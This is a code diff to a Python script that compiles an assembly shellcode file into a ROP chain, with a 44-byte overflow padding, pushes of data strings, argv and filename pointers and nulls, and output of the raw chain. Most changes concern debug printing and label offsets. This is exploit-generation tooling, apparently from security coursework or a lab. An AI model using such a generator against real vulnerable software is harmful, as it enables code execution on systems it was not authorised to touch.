@@ -4,6 +4,7 @@ import re
 import argparse
 from pathlib import Path
 from struct import pack
+from struct import unpack
 import sys
 import os
 
@@ -26,16 +27,14 @@ def main(args):
     gadgets = removeNone(gadgets)
     # print(gadgets.keys(),gadgets.values())
     rop_chain = b'A'*44
-    # sys.stdout.buffer.write(rop_chain)
-    # print("----")
     data_values = []
     null = None
     label_address_map,data_values = reads(args.shellcode, data_address,data_values)
     bytes_pushed,rop_addition,null  = chunking(data_values,data_address, null,label_address_map)
     rop_chain += rop_addition
     rop_chain, register_info = readinstructions(args.shellcode,data_address,data_values,label_address_map,rop_chain,gadgets, null)
-    print(rop_chain.hex())
-    print("----")
+    # print(rop_chain.hex())
+    # print("----")
 
     sys.stdout.buffer.write(rop_chain)
 
@@ -45,7 +44,10 @@ def main(args):
             file.write(rop_chain)
     except FileExistsError:
         print(f"The file '{file_path}' already exists.")
-
+        
+    for address in rop_chain:
+        hex_address = hex(address)
+        print(f"{hex_address}")
 
 def reads(file_name,data_address,data_values):
     rodata_start = False
@@ -68,7 +70,12 @@ def reads(file_name,data_address,data_values):
                         label, data = line.split(':', 1)
                         label = label.strip()
                         data = data.strip()
-                        label_address_map[label] = current_address  # Map label to current address
+                        if(label == 'filename'):
+                            label_address_map[label] = current_address 
+                        elif(label == 'argv'): 
+                            label_address_map[label] = current_address + 2
+                        else: 
+                            label_address_map[label] = current_address + 1
                         if 'db' in data or 'dw' in data or 'dd' in data or 'dq' in data or 'dt' in data:
                             # Parse the data line
                             items, current_address = parse_assembly_line(data, current_address)
@@ -140,39 +147,35 @@ def chunking(array, data_address, null,label_address_map):
     print(data_address, "data_address")
     pointers = []
     rop_chain = b''
-    print(array, "array")
-    print(label_address_map, "label_address_map")
+    # print(array, "array")
+    # print(label_address_map, "label_address_map")
 
     for string in array:
             if string in label_address_map:
-                    print(label_address_map[string],"label_address_map.value[string]")
-                    print(string, "data")
                     rop_chain += Extracted_Functions.push_ptr(label_address_map[string], stack_pointer)
                     stack_pointer += 4
 
 
             elif (string == '0'):
-                    null = stack_pointer
-                    print("string",string)
-                    print(stack_pointer)
-                    rop_chain += Extracted_Functions.push_null(stack_pointer)
+                    rop_add , null = Extracted_Functions.push_null(stack_pointer,null)
+                    rop_chain += rop_add
                     stack_pointer += 4
             else:
-                print("string22", string)
                 pointers.append(stack_pointer)
                 # Split string into chunks of size 4.
                 chunks = [string[i:i + 4] for i in range(0, len(string), 4)]
                 # Convert string to bytes.
                 chunks = [chunk.encode('ascii') for chunk in chunks]
+                print(chunks, "chunks")
                 # If the chunk isn't big enough, pad it with null characters.
                 chunks = [chunk.ljust(4, b'\0') for chunk in chunks]
 
                 for chunk in chunks:
                     rop_chain += Extracted_Functions.push_bytes(chunk, stack_pointer)
                     stack_pointer += 4
-        
-    bytes_pushed = stack_pointer - data_address
+    
 
+    bytes_pushed = stack_pointer - data_address
     return  bytes_pushed, rop_chain, null
     
 
@@ -431,8 +434,10 @@ def parse_assembly_line(data_line,current_address):
             total_bytes = 4
             current_address += total_bytes
         else: 
-            total_bytes = len(processed_items[i]) * bytes_per_item
-            current_address += total_bytes
+
+                total_bytes = len(processed_items[i]) * bytes_per_item
+                current_address += total_bytes
+
 
     return processed_items, current_address
 
